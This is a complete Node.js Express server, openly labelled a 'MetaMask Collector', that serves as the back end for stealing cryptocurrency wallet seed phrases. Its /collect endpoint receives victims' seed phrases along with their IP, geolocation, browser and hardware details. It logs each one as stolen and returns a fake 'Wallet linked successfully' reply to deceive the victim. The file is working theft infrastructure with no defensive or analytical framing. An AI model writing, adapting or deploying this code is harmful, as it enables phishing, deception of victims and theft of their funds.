const express = require('express');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

// Full CORS support + preflight
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }
    next();
});

// Root route so "Cannot GET /" becomes friendly
app.get('/', (req, res) => {
    res.send('MetaMask Collector LIVE 💰 - Ready to steal seeds');
});

app.post('/collect', (req, res) => {
    const data = req.body || {};
    const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
    const geo = geoip.lookup(ip) || {};

    const logEntry = {
        timestamp: new Date().toISOString(),
        seed: data.seed,
        ip: ip,
        geo: `${geo.country || '??'} ${geo.city || ''}`,
        userAgent: data.userAgent,
        platform: data.platform,
        screen: data.screen,
        timezone: data.timezone,
        hardware: data.hardwareConcurrency,
        fullData: data
    };

    console.log('💰 NEW SEED PHRASE STOLEN from ' + ip);
    console.log(JSON.stringify(logEntry, null, 2));

    res.status(200).json({ 
        status: "connected", 
        message: "Wallet linked successfully" 
    });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 MetaMask collector running on port ${port}`);
});
